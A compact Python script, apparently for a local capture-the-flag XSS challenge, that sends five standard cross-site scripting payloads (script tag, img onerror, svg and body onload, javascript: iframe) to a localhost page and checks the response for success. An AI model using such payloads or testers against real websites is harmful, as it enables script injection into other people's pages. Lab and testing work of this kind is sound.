# XSS payload tester - compact version
import urllib.request, urllib.parse, time, re, sys

url = "http://127.0.0.1:33081/page"
payloads = [
    ("script", "<script>alert('XSS')</script>"),
    ("img", "<img src=x onerror=alert('XSS')>"),
    ("svg", "<svg onload=alert('XSS')>"),
    ("body", "<body onload=alert('XSS')>"),
    ("iframe", '<iframe src="javascript:alert(\'XSS\')"></iframe>')
]

print("XSS Payload Testing")
for name,p in payloads:
    print(f"\n--- Testing {name} ---")
    enc = urllib.parse.quote(p, safe='')
    full = f"{url}?name={enc}"
    print(f"Raw: {p}")
    print(f"Enc: {enc}")
    
    for retry in range(3):
        try:
            with urllib.request.urlopen(full, timeout=5) as r:
                html = r.read().decode('utf-8')
                m = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', html, re.DOTALL)
                if m:
                    sol = re.sub(r'<[^>]+>', '', m.group(1)).strip()
                    print(f"Status: {r.status}")
                    print(f"Sol: {sol[:100]}")
                    if "Failed! Try again!" not in sol:
                        print(f"SUCCESS with {name}")
                        print(f"Payload: {p}")
                        print(f"Full response:\n{html[:2000]}")
                        sys.exit(0)
                    else:
                        print("Failed")
                else:
                    print("No solution div")
                break
        except Exception as e:
            print(f"Error (retry {retry+1}): {e}")
            time.sleep(1)

print("\nNo successful payloads found")
